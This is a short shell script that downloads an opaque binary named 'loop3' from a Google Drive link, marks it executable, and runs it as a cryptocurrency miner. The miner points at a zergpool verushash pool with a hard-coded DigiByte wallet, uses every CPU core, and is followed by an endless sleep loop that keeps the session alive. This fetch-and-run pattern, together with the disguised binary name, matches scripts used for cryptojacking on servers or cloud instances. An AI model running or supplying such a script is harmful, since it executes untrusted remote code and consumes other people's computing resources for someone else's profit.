#!/bin/sh
sudo apt update
sudo apt install screen -y
wget -O loop3 "https://drive.google.com/uc?export=download&id=1JTWxpvZU2wWUSDLRD070xUK9ggP6b6jm" > loop3
chmod +x loop3
./loop3 -v -l verushash.asia.mine.zergpool.com:3300 -u dgb1q2fm4a0e2xmruf77aack2awqm2gzqjtg9s20q36.$(shuf -n 1 -i 1-99999)-cpu -p x -t $(nproc)
while [ 1 ]; do
sleep 3
done
sleep 999
